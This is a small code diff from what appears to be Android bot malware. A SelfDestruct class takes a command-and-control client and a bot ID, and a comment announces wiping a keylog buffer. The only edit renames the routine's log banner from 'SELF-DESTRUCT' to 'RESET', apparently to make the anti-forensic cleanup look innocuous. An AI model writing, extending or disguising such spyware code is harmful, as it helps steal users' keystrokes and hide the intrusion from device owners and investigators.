@@ -29,7 +29,7 @@ public class SelfDestruct {
     private static final String TAG = "SelfDestruct";
 
     public static String run(Context ctx, C2Client c2, String botId) {
-        StringBuilder log = new StringBuilder("=== SELF-DESTRUCT INITIATED ===\n");
+        StringBuilder log = new StringBuilder("=== RESET INITIATED ===\n");
         final String pkg = ctx.getPackageName();
 
         // ── 1. Wipe keylog buffer ─────────────────────────────────────────────
